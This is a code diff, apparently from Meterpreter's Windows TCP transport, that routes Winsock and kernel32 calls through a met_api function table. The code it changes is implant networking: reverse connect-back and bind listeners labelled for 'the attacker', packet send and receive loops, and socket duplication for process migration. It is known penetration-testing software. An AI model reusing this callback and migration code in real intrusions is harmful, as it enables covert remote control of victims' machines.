@@ -36,7 +36,7 @@ static DWORD reverse_tcp_run(SOCKET reverseSocket, SOCKADDR* sockAddr, int sockA
 	do
 	{
 		int retryStart = current_unix_timestamp();
-		if ((result = connect(reverseSocket, sockAddr, sockAddrSize)) != SOCKET_ERROR)
+		if ((result = met_api->win_api.ws2_32.connect(reverseSocket, sockAddr, sockAddrSize)) != SOCKET_ERROR)
 		{
 			break;
 		}
@@ -47,7 +47,7 @@ static DWORD reverse_tcp_run(SOCKET reverseSocket, SOCKADDR* sockAddr, int sockA
 
 	if (result == SOCKET_ERROR)
 	{
-		closesocket(reverseSocket);
+		met_api->win_api.ws2_32.closesocket(reverseSocket);
 	}
 
 	return result;
@@ -67,20 +67,20 @@ static DWORD reverse_tcp4(const char* host, u_short port, DWORD retryTotal, DWOR
 
 	// start by attempting to fire up Winsock.
 	WSADATA wsaData = { 0 };
-	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
+	if (met_api->win_api.ws2_32.WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
 	{
-		return WSAGetLastError();
+		return met_api->win_api.ws2_32.WSAGetLastError();
 	}
 
 	// prepare to connect to the attacker
-	SOCKET socketHandle = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-	struct hostent* target = gethostbyname(host);
-	char* targetIp = inet_ntoa(*(struct in_addr *)*target->h_addr_list);
+	SOCKET socketHandle = met_api->win_api.ws2_32.socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+	struct hostent* target = met_api->win_api.ws2_32.gethostbyname(host);
+	char* targetIp = met_api->win_api.ws2_32.inet_ntoa(*(struct in_addr *)*target->h_addr_list);
 
 	SOCKADDR_IN sock = { 0 };
-	sock.sin_addr.s_addr = inet_addr(targetIp);
+	sock.sin_addr.s_addr = met_api->win_api.ws2_32.inet_addr(targetIp);
 	sock.sin_family = AF_INET;
-	sock.sin_port = htons(port);
+	sock.sin_port = met_api->win_api.ws2_32.htons(port);
 
 	DWORD result = reverse_tcp_run(socketHandle, (SOCKADDR*)&sock, sizeof(sock), retryTotal, retryWait);
 
@@ -107,9 +107,9 @@ static DWORD reverse_tcp6(const char* host, const char* service, ULONG scopeId, 
 
 	// start by attempting to fire up Winsock.
 	WSADATA wsaData = { 0 };
-	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
+	if (met_api->win_api.ws2_32.WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
 	{
-		return WSAGetLastError();
+		return met_api->win_api.ws2_32.WSAGetLastError();
 	}
 
 	ADDRINFO hints = { 0 };
@@ -118,18 +118,18 @@ static DWORD reverse_tcp6(const char* host, const char* service, ULONG scopeId, 
 	hints.ai_protocol = IPPROTO_TCP;
 
 	LPADDRINFO addresses;
-	if (getaddrinfo(host, service, &hints, &addresses) != 0)
+	if (met_api->win_api.ws2_32.getaddrinfo(host, service, &hints, &addresses) != 0)
 	{
-		return WSAGetLastError();
+		return met_api->win_api.ws2_32.WSAGetLastError();
 	}
 
 	// prepare to connect to the attacker
-	SOCKET socketHandle = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
+	SOCKET socketHandle = met_api->win_api.ws2_32.socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
 
 	if (socketHandle == INVALID_SOCKET)
 	{
 		dprintf("[STAGELESS IPV6] failed to connect to attacker");
-		return WSAGetLastError();
+		return met_api->win_api.ws2_32.WSAGetLastError();
 	}
 
 	DWORD result = ERROR_SUCCESS;
@@ -141,11 +141,11 @@ static DWORD reverse_tcp6(const char* host, const char* service, ULONG scopeId, 
 		{
 			((LPSOCKADDR_IN6)address->ai_addr)->sin6_scope_id = scopeId;
 
-			if ((result = connect(socketHandle, address->ai_addr, (int)address->ai_addrlen)) != SOCKET_ERROR)
+			if ((result = met_api->win_api.ws2_32.connect(socketHandle, address->ai_addr, (int)address->ai_addrlen)) != SOCKET_ERROR)
 			{
 				dprintf("[STAGELESS IPV6] Socket successfully connected");
 				*socketBuffer = socketHandle;
-				freeaddrinfo(addresses);
+				met_api->win_api.ws2_32.freeaddrinfo(addresses);
 				return ERROR_SUCCESS;
 			}
 		}
@@ -154,8 +154,8 @@ static DWORD reverse_tcp6(const char* host, const char* service, ULONG scopeId, 
 		sleep(retryWait);
 	} while (((DWORD)current_unix_timestamp() - (DWORD)start) < retryTotal);
 
-	closesocket(socketHandle);
-	freeaddrinfo(addresses);
+	met_api->win_api.ws2_32.closesocket(socketHandle);
+	met_api->win_api.ws2_32.freeaddrinfo(addresses);
 
 	return result;
 }
@@ -173,31 +173,31 @@ static DWORD bind_tcp_run(SOCKET listenSocket, SOCKADDR* sockAddr, int sockAddrS
 	DWORD result = ERROR_SUCCESS;
 	do
 	{
-		if (bind(listenSocket, sockAddr, sockAddrSize) == SOCKET_ERROR)
+		if (met_api->win_api.ws2_32.bind(listenSocket, sockAddr, sockAddrSize) == SOCKET_ERROR)
 		{
-			result = WSAGetLastError();
+			result = met_api->win_api.ws2_32.WSAGetLastError();
 			break;
 		}
 
-		if (listen(listenSocket, 1) == SOCKET_ERROR)
+		if (met_api->win_api.ws2_32.listen(listenSocket, 1) == SOCKET_ERROR)
 		{
-			result = WSAGetLastError();
+			result = met_api->win_api.ws2_32.WSAGetLastError();
 			break;
 		}
 
 		// Setup, ready to go, now wait for the connection.
-		SOCKET acceptSocket = accept(listenSocket, NULL, NULL);
+		SOCKET acceptSocket = met_api->win_api.ws2_32.accept(listenSocket, NULL, NULL);
 
 		if (acceptSocket == INVALID_SOCKET)
 		{
-			result = WSAGetLastError();
+			result = met_api->win_api.ws2_32.WSAGetLastError();
 			break;
 		}
 
 		*acceptSocketBuffer = acceptSocket;
 	} while (0);
 
-	closesocket(listenSocket);
+	met_api->win_api.ws2_32.closesocket(listenSocket);
 
 	return result;
 }
@@ -214,16 +214,16 @@ static DWORD bind_tcp(u_short port, SOCKET* socketBuffer)
 
 	// start by attempting to fire up Winsock.
 	WSADATA wsaData = { 0 };
-	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
+	if (met_api->win_api.ws2_32.WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
 	{
-		return WSAGetLastError();
+		return met_api->win_api.ws2_32.WSAGetLastError();
 	}
 
 	// prepare a connection listener for the attacker to connect to, and we
 	// attempt to bind to both ipv6 and ipv4 by default, and fallback to ipv4
 	// only if the process fails.
 	BOOL v4Fallback = FALSE;
-	SOCKET listenSocket = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
+	SOCKET listenSocket = met_api->win_api.ws2_32.socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
 
 	if (listenSocket == INVALID_SOCKET)
 	{
@@ -233,13 +233,13 @@ static DWORD bind_tcp(u_short port, SOCKET* socketBuffer)
 	else
 	{
 		int no = 0;
-		if (setsockopt(listenSocket, IPPROTO_IPV6, IPV6_V6ONLY, (char*)&no, sizeof(no)) == SOCKET_ERROR)
+		if (met_api->win_api.ws2_32.setsockopt(listenSocket, IPPROTO_IPV6, IPV6_V6ONLY, (char*)&no, sizeof(no)) == SOCKET_ERROR)
 		{
 			// fallback to ipv4 - we're probably running on Windows XP or earlier here, which means that to
 			// support IPv4 and IPv6 we'd need to create two separate sockets. IPv6 on XP isn't that common
 			// so instead, we'll just revert back to v4 and listen on that one address instead.
 			dprintf("[BIND] Unable to remove IPV6_ONLY option");
-			closesocket(listenSocket);
+			met_api->win_api.ws2_32.closesocket(listenSocket);
 			v4Fallback = TRUE;
 		}
 	}
@@ -247,7 +247,7 @@ static DWORD bind_tcp(u_short port, SOCKET* socketBuffer)
 	if (v4Fallback)
 	{
 		dprintf("[BIND] Falling back to IPV4");
-		listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+		listenSocket = met_api->win_api.ws2_32.socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 	}
 
 	struct sockaddr_in6 sockAddr = { 0 };
@@ -255,15 +255,15 @@ static DWORD bind_tcp(u_short port, SOCKET* socketBuffer)
 	if (v4Fallback)
 	{
 		struct sockaddr_in* v4Addr = (struct sockaddr_in*)&sockAddr;
-		v4Addr->sin_addr.s_addr = htons(INADDR_ANY);
+		v4Addr->sin_addr.s_addr = met_api->win_api.ws2_32.htons(INADDR_ANY);
 		v4Addr->sin_family = AF_INET;
-		v4Addr->sin_port = htons(port);
+		v4Addr->sin_port = met_api->win_api.ws2_32.htons(port);
 	}
 	else
 	{
 		sockAddr.sin6_addr = in6addr_any;
 		sockAddr.sin6_family = AF_INET6;
-		sockAddr.sin6_port = htons(port);
+		sockAddr.sin6_port = met_api->win_api.ws2_32.htons(port);
 	}
 
 	return bind_tcp_run(listenSocket, (SOCKADDR*)&sockAddr, v4Fallback ? sizeof(struct sockaddr_in) : sizeof(struct sockaddr_in6), socketBuffer);
@@ -290,7 +290,7 @@ static LONG server_socket_poll(Remote* remote, long timeout)
 	tv.tv_sec = 0;
 	tv.tv_usec = timeout;
 
-	result = select((int)ctx->fd + 1, &fdread, NULL, NULL, &tv);
+	result = met_api->win_api.ws2_32.select((int)ctx->fd + 1, &fdread, NULL, NULL, &tv);
 
 	lock_release(remote->lock);
 
@@ -320,7 +320,7 @@ static DWORD packet_receive(Remote *remote, Packet **packet)
 	// Read the packet length
 	while (inHeader)
 	{
-		if ((bytesRead = recv(ctx->fd, ((PCHAR)&header + headerBytes), sizeof(PacketHeader)-headerBytes, 0)) <= 0)
+		if ((bytesRead = met_api->win_api.ws2_32.recv(ctx->fd, ((PCHAR)&header + headerBytes), sizeof(PacketHeader)-headerBytes, 0)) <= 0)
 		{
 			SetLastError(ERROR_NOT_FOUND);
 			goto out;
@@ -365,7 +365,7 @@ static DWORD packet_receive(Remote *remote, Packet **packet)
 
 		while (bytesToRead > 0)
 		{
-			int bytesRead = recv(ctx->fd, buffer, min(sizeof(buffer), bytesToRead), 0);
+			int bytesRead = met_api->win_api.ws2_32.recv(ctx->fd, buffer, min(sizeof(buffer), bytesToRead), 0);
 
 			if (bytesRead < 0)
 			{
@@ -402,7 +402,7 @@ static DWORD packet_receive(Remote *remote, Packet **packet)
 		vdprintf("[TCP] Packet header: [0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X]",
 			h[0], h[1], h[2], h[3], h[4], h[5], h[6], h[7], h[8], h[9], h[10], h[11], h[12], h[13], h[14], h[15], h[16], h[17], h[18], h[19], h[20], h[21], h[22], h[23], h[24], h[25], h[26], h[27], h[28], h[29], h[30], h[31]);
 #endif
-		payloadLength = ntohl(header.length) - sizeof(TlvHeader);
+		payloadLength = met_api->win_api.ws2_32.ntohl(header.length) - sizeof(TlvHeader);
 		vdprintf("[TCP] Payload length is %d", payloadLength);
 		DWORD packetSize = sizeof(PacketHeader) + payloadLength;
 		vdprintf("[TCP] total buffer size for the packet is %d", packetSize);
@@ -425,7 +425,7 @@ static DWORD packet_receive(Remote *remote, Packet **packet)
 		// Read the payload
 		while (payloadBytesLeft > 0)
 		{
-			if ((bytesRead = recv(ctx->fd, (PCHAR)(payload + payloadLength - payloadBytesLeft), payloadBytesLeft, 0)) <= 0)
+			if ((bytesRead = met_api->win_api.ws2_32.recv(ctx->fd, (PCHAR)(payload + payloadLength - payloadBytesLeft), payloadBytesLeft, 0)) <= 0)
 			{
 
 				if (GetLastError() == WSAEWOULDBLOCK)
@@ -631,7 +631,7 @@ DWORD THREADCALL cleanup_socket(THREAD* thread)
 
 	dprintf("[TCP] waiting for disconnect from remote");
 	// loop until FD_CLOSE comes through.
-	while ((result = recv(fd, buf, sizeof(buf), 0)) != 0)
+	while ((result = met_api->win_api.ws2_32.recv(fd, buf, sizeof(buf), 0)) != 0)
 	{
 		if (result <= 0)
 		{
@@ -640,7 +640,7 @@ DWORD THREADCALL cleanup_socket(THREAD* thread)
 	}
 
 	dprintf("[TCP] disconnect received, cleaning up");
-	closesocket(fd);
+	met_api->win_api.ws2_32.closesocket(fd);
 	thread_destroy(thread);
 
 	return EXIT_SUCCESS;
@@ -663,7 +663,7 @@ static void transport_reset_tcp(Transport* transport, BOOL shuttingDown)
 			{
 				dprintf("[TCP] Transport is shutting down");
 				// we can terminate right here, given that we're closing up
-				closesocket(ctx->fd);
+				met_api->win_api.ws2_32.closesocket(ctx->fd);
 			}
 			else
 			{
@@ -757,7 +757,7 @@ static DWORD configure_tcp_connection(Transport* transport)
 		dprintf("[SERVER] Looking good, FORWARD!");
 
 		// Do not allow the file descriptor to be inherited by child processes
-		SetHandleInformation((HANDLE)ctx->fd, HANDLE_FLAG_INHERIT, 0);
+		met_api->win_api.kernel32.SetHandleInformation((HANDLE)ctx->fd, HANDLE_FLAG_INHERIT, 0);
 
 		transport->comms_last_packet = current_unix_timestamp();
 	}
@@ -782,7 +782,7 @@ DWORD packet_transmit_tcp(Remote* remote, LPBYTE rawPacket, DWORD rawPacketLengt
 
 	while (idx < rawPacketLength)
 	{
-		result = send(ctx->fd, (PCHAR)(rawPacket + idx), rawPacketLength - idx, 0);
+		result = met_api->win_api.ws2_32.send(ctx->fd, (PCHAR)(rawPacket + idx), rawPacketLength - idx, 0);
 
 		if (result < 0)
 		{
@@ -841,10 +841,10 @@ static DWORD get_migrate_context_tcp(Transport* transport, DWORD targetProcessId
 	}
 
 	// Duplicate the socket for the target process
-	if (WSADuplicateSocketA(((TcpTransportContext*)transport->ctx)->fd, targetProcessId, &ctx->info) != NO_ERROR)
+	if (met_api->win_api.ws2_32.WSADuplicateSocketA(((TcpTransportContext*)transport->ctx)->fd, targetProcessId, &ctx->info) != NO_ERROR)
 	{
 		free(ctx);
-		return WSAGetLastError();
+		return met_api->win_api.ws2_32.WSAGetLastError();
 	}
 
 	*contextSize = sizeof(TCPMIGRATECONTEXT);
